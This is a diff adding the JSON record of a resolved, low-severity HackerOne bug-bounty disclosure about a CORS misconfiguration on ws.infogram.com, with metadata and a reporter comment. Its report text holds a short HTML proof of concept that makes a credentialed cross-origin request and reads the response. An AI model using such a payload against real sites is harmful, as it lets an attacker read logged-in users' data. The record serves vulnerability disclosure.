@@ -1,0 +1,157 @@
+{
+  "id": 372452,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zNzI0NTI=",
+  "url": "https://hackerone.com/reports/372452",
+  "title": "CORS on (ws.infogram.com)",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "low",
+  "readable_substate": "Resolved",
+  "created_at": "2018-06-28T16:31:36.887Z",
+  "submitted_at": "2018-06-28T16:31:36.887Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "trace0ff",
+    "url": "/trace0ff",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/277/434/5bc6dd170abd50092e62229dce7fbcddb74e4ba1_original.jpg/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 21745,
+    "url": "https://hackerone.com/infogram",
+    "handle": "infogram",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/021/745/553edf21f45ba8f73faba5d308e0d91fc026fef0_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/021/745/553edf21f45ba8f73faba5d308e0d91fc026fef0_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "paused",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Infogram",
+      "twitter_handle": "infogram",
+      "website": "http://infogram.com",
+      "about": "Make Infographics and Charts that People Love"
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2018-10-08T08:20:46.193Z",
+  "bug_reporter_agreed_on_going_public_at": "2018-09-20T20:56:23.438Z",
+  "team_member_agreed_on_going_public_at": "2018-10-08T08:20:46.122Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Hey Team i don't know if it's valid or not i just want to let you know about this thanks.\n```````````\nExploit\n``````````````````\n<html>\n<script>\nvar req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://ws.infogram.com/socket.io/?EIO=3&transport=polling&t=MH7BU79',true); req.withCredentials = true; req.send('{}'); function reqListener() { alert(this.responseText); };\n</script>\n</html>\n\n## Impact\n\nAs with superpowers, it’s all about knowing how to use it. Therefore, CORS is not necessarily a bad thing. We’ve seen in many cases that CORS has legitimate use, and this is why it was invented and made a web standard in the first place. However, you need to be aware of the CORS configuration you set up in your server and the side effects this has on security.",
+  "weakness": {
+    "id": 26,
+    "name": "Improper Access Control - Generic"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 313306,
+      "file_name": "Capture.JPG",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/313/306/48acd0c76920afd915bf4ab8c549b8b81750f28e/Capture.JPG?response-content-disposition=attachment%3B%20filename%3D%22Capture.JPG%22%3B%20filename%2A%3DUTF-8%27%27Capture.JPG&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQVGEMB3M2%2F20260221%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260221T021559Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENj%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDkIiWpI5dRdasE%2BpswjiZVlugSME%2FJ009bswcwoKGQMgIhANQ3BFYmHDQfoCyGgPjaMwBadQ2WExGsYa5M%2BN9%2FDeofKrsFCKH%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5IgzOi%2BwS7Tnqog6s9ygqjwVD1RtnLZ5Lpwc7uaBI0hIdc60%2FxDZBqePbqXgQ0zKfyp04SGVBQ6ylcJ1YHNWXkwJ3n2PPm6wt2nvgkHZgpueWuW6oJxT5aIJJoYpoBsZURwj8Zlew5sd7UyYRCvsG9gchen1xfJVA9A8%2BTS4hhKXe4yePFzaJ3QgoTlLVIAd5YqktZTrsg0y9P4fFbuaWeWVo1elDL1nalZsJJ2JYMXUm4gpB1MSRi%2BxtoaCbijiL%2BZJh8m0w4AVJCZsj%2BPz%2Fm3BFcvhLsXKEe34Stn6L%2FKHBfQkz7Tq%2B44WcW9hp68FHoUvpNyqgV01hXPviAbJS3oeo4w6I0enZepK5Nlqb%2FpbcnlkvOyNEPGGgfZtxsKrofSt2dor6qCx%2F7Iu5Y32RepvxlPfkgdjpQfDBP8A4LB%2F5ABI2iL5whn9SFWeHKn2E9AkHg%2Blor8Rg1rlKEKFSJHGQldD5p%2FmqNiL7WX9QWiqqk87QWeBKDVLeAVNTgr13Cueqvaa0QVOP4WmWuMn29mOFX4LX2SDiZVPjd5saZWsLKwOSArtQzFEl%2Bo5HlfkNaYN6xOpe7VuDDhrrwCjs97L%2FOjtkOn9imUPGM3bktbThiG4aNSAAypzejrG%2F0Q2Ihcd0Xn7lhzKX%2BHPCsN7fUw%2BG5lOatuJNp6Wz6%2F82BiWUke9pOosV485YijVR2cl4e%2FFfnOQcrMqs2jMLO5PuI2DPEKz5yj8%2BC7g9CeW0kiRrJhUD9POYwhK3Sm4aeqptHPjirAOn7CEahKg382rFHHyphiRvHUG2GF5N46QBO3de2TA7pRxrEP01TOGLzin8rwGKKwWG2BWKovc2MdXfTE%2F7le0PMvlO3v60IvNoIoECWmwLbISt1WStT%2BX7uIBDMOrm48wGOrABMtQsGlC7aicjBKSMFO9lF%2Bd2wrjiitfdld3jsmC4obUypwwJVoTZzf2pCrXD9yRHYKbKvN3bYu4m1VZOlMVdC8eCCxmxec4eKg5aretx3w4uCaEv%2B8k7RyPAKD6Ba8KN8xWbtiJpgxewJX1Ujtx7WSBVixlq3UEMoTxbxCCcB%2FfcMfAjDIMqS1Uz9ZzQyAyF150blBsk8zPFOvXXHz8j7z9y3nhtNlNl6iMuyuC%2FqzA%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=33eeceb98613f4be8851470727cf0abf8c2e4ecfeff9b03b5a32d698e5a5ac1f",
+      "file_size": 91571,
+      "type": "image/jpeg",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2018-10-20T20:56:23.595Z",
+  "allow_singular_disclosure_after": -231571176.1336024,
+  "singular_disclosure_allowed": true,
+  "vote_count": 12,
+  "voters": [
+    "savitar0x01",
+    "apapedulimu",
+    "eveeez",
+    "japz",
+    "cryptographer",
+    "silv3rpoision",
+    "trace0ff",
+    "0xm1racle",
+    "nicotine-py",
+    "zackyrest06",
+    "and 2 more..."
+  ],
+  "severity": {
+    "rating": "low",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 870,
+    "asset_type": "URL",
+    "asset_identifier": "infogram.com",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "id": 16540,
+      "category": "researcher",
+      "content": "It was the 2nd report of my life!\nMemories <3",
+      "updated_at": "2019-06-06T20:43:59.717Z",
+      "can_view?": true,
+      "can_create?": false,
+      "attachments": [],
+      "user": {
+        "id": 277434,
+        "username": "trace0ff",
+        "name": "Silent Signal",
+        "bio": "The signal ends here.",
+        "cleared": false,
+        "verified": true,
+        "website": null,
+        "location": "",
+        "created_at": "2018-05-14T19:37:32.104Z",
+        "url": "https://hackerone.com/trace0ff",
+        "hackerone_triager": false,
+        "hackerone_employee": false,
+        "user_type": "hacker",
+        "profile_picture_urls": {
+          "small": "https://profile-photos.hackerone-user-content.com/variants/000/277/434/5bc6dd170abd50092e62229dce7fbcddb74e4ba1_original.jpg/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef",
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/277/434/5bc6dd170abd50092e62229dce7fbcddb74e4ba1_original.jpg/d9695107bfcd68eeb1c9e0912b109cdae9a6c00c0bda6fd4cbd6d9bdb828840a",
+          "xtralarge": "https://profile-photos.hackerone-user-content.com/variants/000/277/434/5bc6dd170abd50092e62229dce7fbcddb74e4ba1_original.jpg/4ac84fbe897190579a137d0cf55152b233cdd4f9984435bd80ef67e5e51a0586"
+        }
+      }
+    }
+  ]
+}
